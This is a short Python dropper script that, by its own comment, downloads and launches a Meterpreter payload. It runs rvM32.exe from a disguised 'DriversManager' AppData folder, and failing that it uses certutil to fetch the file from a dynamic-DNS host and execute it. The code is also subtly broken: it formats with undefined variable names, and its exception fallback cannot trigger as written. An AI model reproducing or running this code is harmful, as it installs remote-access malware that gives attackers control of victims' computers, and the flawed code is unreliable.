#/usr/bin/python
#coding:utf-8
import os
# ENVIRONMENT VARIABLE TO USE
d = os.environ["SystemDrive"]
usr = os.environ["USERNAME"]
# FUNCTION TO DOWNLOAD METERPRETER PAYLOAD
def dwnExec():
    exc = "START /MIN {}\\Users\\{}\\AppData\\Roaming\\DriversManager\\rvM32.exe".format(letter_drive_path, current_user)
    try:
        os.system(exc)
    except FileNotFoundError:
        dwn = 'certutil -urlcache -split /f "http://cvdrsn.ddns.net/rvM32.exe" "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\rvM32.exe"'.format(letter_drive_path, current_user)
        os.system(dwn)
        os.system(exc)

dwnExec()
